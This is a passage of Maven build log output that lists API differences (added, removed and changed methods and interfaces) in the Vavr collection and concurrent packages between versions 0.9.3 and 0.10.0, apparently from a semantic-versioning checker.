toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.LinkedHashMap\n[INFO]          + method collector(java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method collector(java.util.function.Function,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.LinkedHashMap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.LinkedHashMap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.LinkedHashMap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.LinkedHashMap\n[INFO]      > class io.vavr.collection.LinkedHashMultimap\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asMap()\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.LinkedHashMultimap$Builder\n[INFO]          + method fill(int,io.vavr.Tuple2)\n[INFO]              + return io.vavr.collection.LinkedHashMultimap\n[INFO]      < class io.vavr.collection.LinkedHashSet\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.LinkedHashSet\n[INFO]      > class io.vavr.collection.PriorityQueue\n[INFO]          > method dropUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.AbstractQueue\n[INFO]              - return io.vavr.collection.PriorityQueue\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + annotated io.vavr.collection.GwtIncompatible\n[INFO]              + return io.vavr.collection.PriorityQueue\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.AbstractQueue\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.Queue\n[INFO]          > method dropUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.AbstractQueue\n[INFO]              - return io.vavr.collection.Queue\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Queue\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.AbstractQueue\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Queue\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Queue\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Queue\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Queue\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.Stream$Cons\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Integer)\n[INFO]              + return boolean\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.StreamModule$AppendElements\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Integer)\n[INFO]              + return boolean\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.StreamModule$ConsImpl\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Integer)\n[INFO]              + return boolean\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.StreamModule$StreamIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.TreeMap\n[INFO]          + method collector(java.util.Comparator,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method collector(java.util.Comparator,java.util.function.Function,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method collector(java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method collector(java.util.function.Function,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.TreeMap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.TreeMap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.TreeMap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.TreeMap\n[INFO]      > class io.vavr.collection.TreeMultimap\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asMap()\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.TreeMultimap$Builder\n[INFO]          + method fill(int,io.vavr.Tuple2)\n[INFO]              + return io.vavr.collection.TreeMultimap\n[INFO]          + method fill(java.util.Comparator,int,io.vavr.Tuple2)\n[INFO]              + return io.vavr.collection.TreeMultimap\n[INFO]      < class io.vavr.collection.TreeSet\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.TreeSet\n[INFO]      < class io.vavr.collection.Vector\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Vector\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Vector\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Vector\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Vector\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Vector\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Vector\n[INFO]      > interface io.vavr.collection.BitSet\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.BitSet\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.IndexedSeq\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Integer)\n[INFO]              + return boolean\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.IndexedSeq\n[INFO]          + method rotateLeft(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.IndexedSeq\n[INFO]          + method rotateRight(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.IndexedSeq\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.IndexedSeq\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.IndexedSeq\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < interface io.vavr.collection.Iterator\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method iterate(java.util.function.Supplier)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.LinearSeq\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Integer)\n[INFO]              + return boolean\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.LinearSeq\n[INFO]          + method rotateLeft(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.LinearSeq\n[INFO]          + method rotateRight(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.LinearSeq\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.LinearSeq\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.LinearSeq\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.List\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Integer)\n[INFO]              + return boolean\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.Map\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.Multimap\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asMap()\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.Seq\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asPartialFunction()\n[INFO]              + access abstract\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method rotateLeft(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method rotateRight(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.Set\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Set\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.SortedMap\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          > method put(io.vavr.Tuple2,java.util.function.BiFunction)\n[INFO]              - return io.vavr.collection.Map\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          > method put(java.lang.Object,java.lang.Object,java.util.function.BiFunction)\n[INFO]              - return io.vavr.collection.Map\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          > method replace(java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              - return io.vavr.collection.Map\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          > method replaceAll(java.util.function.BiFunction)\n[INFO]              - return io.vavr.collection.Map\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          > method replaceValue(java.lang.Object,java.lang.Object)\n[INFO]              - return io.vavr.collection.Map\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.SortedMultimap\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asMap()\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMultimap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMultimap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMultimap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMultimap\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.SortedSet\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedSet\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.Stream\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Integer)\n[INFO]              + return boolean\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + method iterate(java.util.function.Supplier)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < interface io.vavr.collection.Traversable\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Traversable\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < interface io.vavr.collection.Tree\n[INFO]          + method build(java.lang.Iterable,java.util.function.Function,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Tree\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method recurse(java.lang.Object,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Tree$Node\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + version 0.10.0\n[INFO]      - version 0.9.3\n[INFO] -----------------------------------------------------------------------------------------------------------\n[INFO] > io.vavr.concurrent                                 major      0.10.0     0.9.3      1.0.0      Version increase required\n[INFO]      > interface io.vavr.concurrent.Future\n[INFO]          + field DEFAULT_EXECUTOR\n[INFO]              + access final\n[INFO]              + access static\n[INFO]              + return java.util.concurrent.Executor\n[INFO]          + method await(long,java.util.concurrent.TimeUnit)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          + method executor()\n[INFO]              + return java.util.concurrent.Executor\n[INFO]          + method failed(java.util.concurrent.Executor,java.lang.Throwable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method failed(java.util.concurrent.ExecutorService,java.lang.Throwable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method find(java.util.concurrent.Executor,java.lang.Iterable,java.util.function.Predicate)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method find(java.util.concurrent.ExecutorService,java.lang.Iterable,java.util.function.Predicate)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method firstCompletedOf(java.util.concurrent.Executor,java.lang.Iterable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method firstCompletedOf(java.util.concurrent.ExecutorService,java.lang.Iterable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method fold(java.util.concurrent.Executor,java.lang.Iterable,java.lang.Object,java.util.function.BiFunction)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method fold(java.util.concurrent.ExecutorService,java.lang.Iterable,java.lang.Object,java.util.function.BiFunction)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method fromCompletableFuture(java.util.concurrent.Executor,java.util.concurrent.CompletableFuture)\n[INFO]              + access static\n[INFO]              + annotated io.vavr.concurrent.GwtIncompatible\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method fromCompletableFuture(java.util.concurrent.ExecutorService,java.util.concurrent.CompletableFuture)\n[INFO]              - access static\n[INFO]              - annotated io.vavr.concurrent.GwtIncompatible\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method fromJavaFuture(java.util.concurrent.Executor,java.util.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method fromJavaFuture(java.util.concurrent.ExecutorService,java.util.concurrent.Future)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method fromTry(java.util.concurrent.Executor,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method fromTry(java.util.concurrent.ExecutorService,io.vavr.control.Try)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method isCancelled()\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + method of(java.util.concurrent.Executor,io.vavr.CheckedFunction0)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method of(java.util.concurrent.ExecutorService,io.vavr.CheckedFunction0)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method ofCallable(java.util.concurrent.Executor,java.util.concurrent.Callable)\n[INFO]              + access static\n[INFO]              + return 